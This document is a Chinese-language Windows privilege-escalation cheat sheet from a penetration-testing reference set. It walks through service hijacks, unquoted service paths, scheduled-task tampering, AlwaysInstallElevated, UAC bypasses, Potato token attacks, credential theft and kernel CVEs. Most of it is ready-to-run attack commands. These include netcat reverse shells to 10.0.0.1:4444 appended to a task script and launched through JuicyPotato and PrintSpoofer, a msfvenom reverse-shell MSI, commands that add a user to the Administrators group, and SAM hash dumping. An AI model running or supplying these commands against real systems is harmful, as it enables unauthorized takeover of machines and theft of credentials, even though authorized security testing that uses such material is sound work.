# Windows 提权实战参考
- 提权后凭据获取 → `post-credentials.md`
- 域渗透横向移动 → `post-ad.md`

> 流程: whoami→信息收集→自动审计→服务→计划任务→权限配置→AlwaysInstall→UAC绕过→内核

> **last_updated**: 2026-06-04 | **tested_against**: Windows Server 2019/2022, PrintSpoofer, Potato系列
---

## 1. 初始枚举 (第一时间)

### 1.1 快速信息收集

```powershell
# === 一次性收集 ===
whoami; whoami /priv; whoami /groups; net user; net localgroup; net localgroup Administrators
systeminfo; hostname
netstat -ano; ipconfig /all; route print
tasklist /svc; sc query state= all | findstr "SERVICE_NAME"
schtasks /query /fo LIST /v
icacls "C:\Program Files\*" 2>nul | findstr "BUILTIN\Users:(F)"
dir /s /b "C:\*.kdbx" "C:\*.zip" "C:\*.bak" "C:\*.config" "C:\*.ini" 2>nul
```

### 1.2 自动审计工具

```powershell
# === WinPEAS (推荐 — 最全面) ===
WinPEASany.exe
WinPEASx64.exe quiet cmd         # 静默→cmd输出
WinPEASx64.exe quiet filesout    # 静默→文件输出

# === Seatbelt (.NET) ===
Seatbelt.exe -group=all

# === PowerUp (PowerShell) ===
. .\PowerUp.ps1
Invoke-AllChecks

# === Watson / Windows-Exploit-Suggester ===
# Watson → 找缺失补丁对应的 CVE
Watson.exe

# === PrivescCheck (PowerShell) ===
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

---

## 2. 服务相关提权

### 2.1 弱服务权限

```powershell
# === 查找可修改的服务 ===
# AccessChk (Sysinternals):
accesschk.exe -ucqv *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

# 如果显示 SERVICE_CHANGE_CONFIG 或 SERVICE_ALL_ACCESS
# → 可修改服务配置

# === 修改服务 binpath ===
sc config <VulnService> binpath= "C:\temp\shell.exe"
sc start <VulnService>

# 或者:
sc config <VulnService> binpath= "cmd.exe /c net localgroup Administrators <user> /add"
```

### 2.2 不带引号的服务路径

```powershell
# 查找路径中含空格且无引号的服务
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
sc qc <service_name>      # 查看具体服务配置

# 示例: 服务路径 = C:\Program Files\Vuln App\service.exe
# → 创建 C:\Program.exe 或 C:\Program Files\Vuln.exe
# → 服务启动时 → 执行我们的 exe
```

### 2.3 服务注册表权限

```powershell
# 检查服务注册表项的可写权限
# HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
# 用 subinacl / SetACL 检查
# 如果 ImagePath 可写 → 改路径提权
```

---

## 3. 计划任务提权

### 3.1 可写的脚本/可执行文件

```powershell
# === 列计划任务 ===
schtasks /query /fo LIST /v

# === 查看脚本文件权限 ===
icacls "C:\Scripts\task.ps1"
icacls "C:\Program Files\App\backup.bat"
# 如果 BUILTIN\Users 有 Write/Modify → 追加恶意命令

echo "C:\temp\nc.exe 10.0.0.1 4444 -e cmd.exe" >> "C:\Scripts\task.ps1"
```

### 3.2 计划任务路径漏洞

```powershell
# 如果计划任务调用 .bat/.ps1 且用相对路径
# → PATH 劫持: 在当前目录创建同名文件
```

---

## 4. AlwaysInstallElevated

```powershell
# 检测:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两个都是 0x1 → 可以利用

# 利用: 生成 MSI 提权安装包
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 5. UAC 绕过

### 5.1 检测 UAC 级别

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# ConsentPromptBehaviorAdmin = 
#   0 → 不提示 (可提权)
#   2 → 提示输入凭据 (提示凭据框)
#   5 → 提示同意 (正常UAC)
```

### 5.2 常用 UAC Bypass 方法

```powershell
# === FodHelper Bypass (Win10) ===
# 原理: FodHelper.exe 是受信任的自动提升程序
# POC: UACMe #33 / FodhelperBypass.ps1

# === ComputerDefaults Bypass ===
# POC: UACMe #59

# === SDCLT Bypass (Win10) ===
# 利用 sdclt.exe 自动提升 + DLL劫持

# === Event Viewer Bypass ===
# mmc.exe + eventvwr.msc → DLL 劫持

# 工具: UACMe (含 60+ 种UAC绕过方法)
# https://github.com/hfiref0x/UACME
akagi32.exe 23   # 指定方法编号
akagi64.exe 61
```

---

## 6. Token 提权

### 6.1 Potato 家族

```powershell
# === JuicyPotato (Win Server < 2019 / Win10 < 1803) ===
# 需要: SeImpersonatePrivilege
JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -t *

# CLSID: 选一个适合的 (BITS/KTMW32/...)
JuicyPotato.exe -l 1337 -p "c:\temp\nc.exe" -a "-e cmd.exe 10.0.0.1 4444" -c "{BITS的CLSID}" -t *

# === RoguePotato (Win10 1803+) ===
# === PrintSpoofer (Win10/Server2019) ===
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "c:\temp\nc.exe 10.0.0.1 4444 -e cmd.exe"

# === SweetPotato ===
# === GodPotato (Win11/Server2022) ===
GodPotato.exe -cmd "cmd /c whoami"
```

### 6.2 检查 Token 权限

```powershell
whoami /priv
# 重点看:
# SeImpersonatePrivilege  → Potato系列
# SeAssignPrimaryTokenPrivilege  → Potato
# SeDebugPrivilege  → 注入到SYSTEM进程
# SeTakeOwnershipPrivilege  → 获取文件所有权
# SeRestorePrivilege  → 覆盖/替换文件
# SeBackupPrivilege  → 读取任何文件
```

---

## 7. 凭据窃取提权

```powershell
# === 从 Windows Credential Vault 读密码 ===
vaultcmd /listcreds:"Windows Credentials" /all

# === 浏览器保存的密码 → LaZagne ===
lazagne.exe all

# === 内存密码 (需管理员) → 见 post-credentials.md ===

# === RunAs 储存的凭据 ===
cmdkey /list
# 如果有:
runas /savecred /user:Administrator cmd.exe

# === Sysprep / Unattend → 明文密码 ===
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep.inf
```

---

## 8. 内核漏洞提权

### 8.1 补丁枚举 + 匹配 CVE

```powershell
systeminfo                     # 列出补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn   # 更详细

# → Watson / Sherlock 对比缺失补丁
# → 匹配到 CVE → 编译利用程序
```

### 8.2 经典 CVE 速查

| CVE | 影响 | 利用 |
|-----|------|------|
| MS16-032 (CVE-2016-0099) | Win7-Win10, Server2008-2012R2 | Secondary Logon Handle |
| MS17-010 | Win7-Win8, Server2008-2012 (SMB) | EternalBlue → SYSTEM |
| CVE-2019-0841 | Win7-Win10 < 1803 | AppX Deployment Service |
| CVE-2021-36934 | Win10 1809+ | HiveNightmare / SeriousSAM |
| CVE-2021-42287 | AD 域 | samAccountName spoofing |
| CVE-2022-21907 | Win10/Win11, Server2022 | HTTP.sys |
| MS16-075 | Win7-Win10 | Hot Potato / JuicyPotato |

### 8.3 HiveNightmare (CVE-2021-36934)

```powershell
# 影响: Win10 1809+ 未更新 KB5005357
# SAM/SYSTEM/SECURITY 文件对 Users 组可读
# 直接读 SAM → dump hash

# 检测:
icacls C:\Windows\System32\config\SAM
# BUILTIN\Users:(R) → 可读 → 受漏洞影响

# 利用:
# HiveNightmare.exe → 自动导出 SAM/SYSTEM/SECURITY
# → 用 secretsdump.py 拉 hash
```

---
## 相关参考
- 提权后凭据获取 → `post-credentials.md`
- 域渗透横向移动 → `post-ad.md`

*参考: WinPEAS + PayloadAllTheThings + HackTricks + 实战*
